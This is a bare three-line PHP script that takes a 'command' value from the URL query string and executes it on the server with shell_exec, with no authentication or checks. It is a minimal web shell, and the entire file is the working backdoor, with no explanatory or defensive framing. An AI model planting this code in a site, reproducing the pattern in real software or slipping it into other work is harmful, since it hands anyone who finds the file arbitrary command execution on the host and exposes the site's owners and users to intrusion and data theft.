<?php
  $command = urldecode($_GET['command']);
  shell_exec($command);
?>